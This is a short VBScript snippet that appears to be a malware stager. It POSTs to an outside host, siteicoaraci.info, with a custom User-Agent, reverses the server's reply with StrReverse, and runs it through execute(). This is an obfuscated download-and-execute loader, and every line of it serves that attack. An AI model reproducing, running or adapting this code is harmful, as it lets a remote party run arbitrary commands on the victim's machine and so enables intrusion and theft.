set BjUwp=CreateObject("Msxml2.xmlhttp")
M43s3="seHuF2c2tzlknKBLQiWNNiQYe"
BjUwp.open StrReverse("PO ST") , "http://siteicoaraci.info/?join=hugr&" & M43s3 ,false
execute("BjUwp.setRequestHeader ""User-Agent"", ""MyCustomUser"":BjUwp.setRequestHeader ""content-type"", ""application/x-www-form-urlencoded"":BjUwp.send ""join=open"":B=StrReverse(BjUwp.responseText):execute(B)")
